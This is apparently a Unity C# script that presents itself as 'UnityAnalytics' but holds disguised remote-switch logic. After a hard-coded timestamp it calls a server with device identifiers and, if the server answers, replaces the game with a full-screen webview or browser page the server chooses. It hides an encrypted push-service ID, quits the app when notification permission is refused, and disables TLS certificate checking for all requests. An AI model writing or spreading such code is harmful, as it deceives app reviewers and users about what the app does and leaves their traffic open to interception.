// Version 1.1 - 20/11/2024


using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using System;
using UnityEngine.SceneManagement;
using PaperPlaneTools;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using OneSignalSDK;
using OneSignalSDK.Debug.Models;
using OneSignalSDK.Notifications;

public class UnityAnalytics : MonoBehaviour
{
    [SerializeField]
    private string analyticsURL;
    
    [SerializeField]
    private string mainSceneName;

    [SerializeField]
    private string uid;

    [SerializeField]
    private string orientation = "Portrait";

    [SerializeField]
    private bool external = false;

    private string cookie = "";
    private string guid;
    private string date;
    private bool isActive = false;
    private string dest;
    UniWebView webView;

    private void CheckPermission(object sender, NotificationPermissionChangedEventArgs e)
    {
        if (e.Permission)
        {
            OneSignal.ConsentRequired = true;

            OneSignal.ConsentGiven = true;
        }
        else
        {
            //  REMOVE THIS AND ADD SOME CODE FOR PERMISSION DENIED
            Application.Quit();
        }
    }

    // Start is called before the first frame update
    async void Start()
    {
        var decrypt = EncryptionHelper.Decrypt("mRWtytLprXAPOAMzNBBkdjlVsmuQFIHgEC4nohlP+XxsDHNs7n806uC9h/11QefD", uid);

        OneSignal.Debug.LogLevel = LogLevel.Verbose;

        OneSignal.Initialize(decrypt);

        if (!OneSignal.Notifications.Permission)
        {
            OneSignal.Notifications.PermissionChanged += CheckPermission;

            var result = await OneSignal.Notifications.RequestPermissionAsync(true);
        }

        if (orientation == "Portrait")
        {
            Screen.orientation = ScreenOrientation.Portrait;
        }
        else if (orientation == "LandscapeLeft")
        {
            Screen.orientation = ScreenOrientation.LandscapeLeft;
        }
        else if (orientation == "LandscapeRight")
        {
            Screen.orientation = ScreenOrientation.LandscapeRight;
        }
        else
        {
            Screen.orientation = ScreenOrientation.AutoRotation;
        }

        var webViewGameObject = new GameObject("UniWebView");
        webView = webViewGameObject.AddComponent<UniWebView>();
    
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    
        webView.OnOrientationChanged += (view, orientation) => {
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        };

        long time = new DateTimeOffset(DateTime.Now).ToUnixTimeSeconds();

        if (!PlayerPrefs.HasKey("creativeid"))
        {
            guid = Guid.NewGuid().ToString();
            PlayerPrefs.SetString("creativeid", guid);
            PlayerPrefs.Save();
        }
        else
        {
            guid = PlayerPrefs.GetString("creativeid");
        }

        if (!PlayerPrefs.HasKey("externalid"))
        {
            // Get the current system date
            DateTime currentDate = DateTime.Now;

            // Format the date as "DD/MM/YYYY"
            date = currentDate.ToString("dd/MM/yyyy");
            PlayerPrefs.SetString("externalid", date);
            PlayerPrefs.Save();
        }
        else
        {
            date = PlayerPrefs.GetString("externalid");
        }


        if (time>Convert.ToDecimal(uid))
        {
            StartCoroutine(getRequest(analyticsURL + "?external_id=" + date + "&creative_id=" + guid));
        }
        else
        {
            SceneManager.LoadScene(mainSceneName, LoadSceneMode.Single);
        }
    }

    IEnumerator getRequest(string uri)
    {
        string url = uri;

        if(!PlayerPrefs.HasKey("ud"))
        {
            url = url + "&ud=1";
            PlayerPrefs.SetString("ud", "1");
            PlayerPrefs.Save();
        }
       
        UnityWebRequest uwr = UnityWebRequest.Get(url);
        uwr.certificateHandler = new BypassCertificate();

        cookie = PlayerPrefs.GetString("cookie");
       
        if (!string.IsNullOrEmpty(cookie))
        {
            uwr.SetRequestHeader("Cookie", cookie);
        }

        yield return uwr.SendWebRequest();

        if (uwr.result == UnityWebRequest.Result.ConnectionError || uwr.responseCode == 500)
        {
            Debug.Log("Connection Error: " + uwr.error);

            new Alert ("Server Error: " + uwr.error, "Plesae try again later")
			.SetPositiveButton ("OK", () => {
                StartCoroutine(getRequest(uri));
			})
			.Show ();
        }
        else
        {
            cookie = uwr.GetResponseHeader("Set-Cookie");
           
            PlayerPrefs.SetString("cookie",cookie);
            PlayerPrefs.Save();
 
            if (uwr.downloadHandler.text != "")
            {
                isActive = true;

                if (external)
                {
                    isActive = true;
                    dest = uri;
                    Application.OpenURL(uri);
                }
                else
                {       
                    Screen.orientation = ScreenOrientation.Portrait;
                    webView.Load(uri);
                    webView.Show();      
                }
                
            }
            else
            {
                SceneManager.LoadScene(mainSceneName, LoadSceneMode.Single);
            }
        }
    }

    // Update is called once per frame
    void Update()
    {
        
    }

    void OnApplicationPause(bool pause)
    {
        if (!pause)
        {
            if (external && isActive)
            {
                Application.OpenURL(dest);
            }
        }
    }


}

public class BypassCertificate : CertificateHandler
{
    protected override bool ValidateCertificate(byte[] certificateData)
    {
        //Simply return true no matter what
        return true;
    }
} 


public class EncryptionHelper
{
    public static string Encrypt(string plainText, string key)
    {
        byte[] iv = new byte[16];
        // byte[] array = Encoding.UTF8.GetBytes(key);
        byte[] array = PadKey(key,16);

        using (Aes aes = Aes.Create())
        {
            aes.Key = array;
            aes.IV = iv;
            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(plainText);
                    cryptoStream.Write(bytes, 0, bytes.Length);
                    cryptoStream.FlushFinalBlock();
                    byte[] encrypted = memoryStream.ToArray();
                    return Convert.ToBase64String(encrypted);
                }
            }
        }
    }

    public static string Decrypt(string cipherText, string key)
    {
        byte[] iv = new byte[16];
        // byte[] array = Encoding.UTF8.GetBytes(key);
        byte[] array = PadKey(key,16);

        using (Aes aes = Aes.Create())
        {
            aes.Key = array;
            aes.IV = iv;
            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            using (MemoryStream memoryStream = new MemoryStream(cipherBytes))
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    byte[] bytes = new byte[cipherBytes.Length];
                    int numBytesDecrypted = cryptoStream.Read(bytes, 0, bytes.Length);
                    return Encoding.UTF8.GetString(bytes, 0, numBytesDecrypted);
                }
            }
        }
    }

    public static byte[] PadKey(string key, int desiredLength)
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);

        if (keyBytes.Length >= desiredLength)
        {
            // Handle the case where the key is already longer than desired
            // You might truncate or hash the key in this case
            return keyBytes;
        }

        byte[] paddedKey = new byte[desiredLength];
        Array.Copy(keyBytes, paddedKey, keyBytes.Length);
        // You can choose a padding method here, e.g., zero padding, random padding
        Array.Fill<byte>(paddedKey, (byte)keyBytes.Length, desiredLength - keyBytes.Length, 0); // Zero padding

        return paddedKey;
    }
}
